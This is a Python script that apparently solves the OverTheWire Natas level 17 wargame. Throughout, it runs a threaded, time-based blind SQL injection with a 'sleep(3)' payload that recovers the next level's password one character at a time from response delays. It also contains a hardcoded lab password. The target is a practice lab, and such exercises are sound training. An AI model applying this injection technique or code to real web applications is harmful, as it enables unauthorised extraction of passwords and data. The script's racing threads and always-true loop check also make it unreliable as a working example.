from threading import Thread
import requests
from requests.auth import HTTPBasicAuth
import time

cSetReady = 0
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = chars
passwd = ''

url = 'http://natas17.natas.labs.overthewire.org/?debug'
usr = 'natas17'
pwd = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

param = 'username'
SQLi = 'natas18" and password LIKE BINARY "{}"  and sleep(3)#'
correctResponse = 'exists.'

browser = requests.Session()
browser.auth = (usr, pwd)

def inject(char):
    global passwd
    payload = SQLi.format(passwd + char + '%') 
    Data = { param : payload }
    try:
        r = browser.post(url, data=Data)    
#    if correctResponse in r.text :
        if(r.elapsed.seconds >= 3):  
            passwd += char
            print(passwd)
    except Exception as e:
        print("erro ", end='')
"""
def  getCharSet(char):
    global filtered
    global cSetReady
    payload = SQLi.format('%' + char + '%')
    Data = { param : payload }
    r = browser.post(url, data=Data)
#    if correctResponse in r.text :
    if(r.elapsed.seconds >= 5):  
        filtered += char
    cSetReady += 1
    print("{0}\n".format(r.elapsed.seconds),end='')
        
print('getting charset .... ')
for char in chars:
    time.sleep(0.1)
    Thread(target=getCharSet, args={char}).start()
while cSetReady != len(chars):
    pass
print("Filter : " + filtered)
"""

for i in range(0,32):
    for char in filtered:
        check = len(passwd)
        if len(passwd) == check :            
            Thread(target=inject, args={char}).start()
        else:
            break;
    while len(passwd) == check and not len(passwd) == 32:
        pass
    

